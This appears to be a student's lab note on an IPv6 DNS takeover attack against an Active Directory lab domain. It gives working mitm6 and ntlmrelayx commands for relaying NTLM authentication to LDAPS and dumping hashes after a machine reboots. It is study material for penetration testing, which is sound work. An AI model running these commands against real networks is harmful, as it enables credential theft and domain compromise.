
This is one of the craziest attack that we can pull of without any access.
```
mitm6 -d marvel.local
```

Before running the above command we have to run the ntlm relay
```
ntlmrelayx.py -6 -t ldaps://192.168.17.139 -wh fakewpad.marvel.local -l lootme 
```
![[Pasted image 20240122221820.png]]
Make Sure there are no error and it should run like this

We can only run mitm6 in small sprints and to trigger the event will simply reboot the machine and than the relay effect will come into play and will get the hashes dump

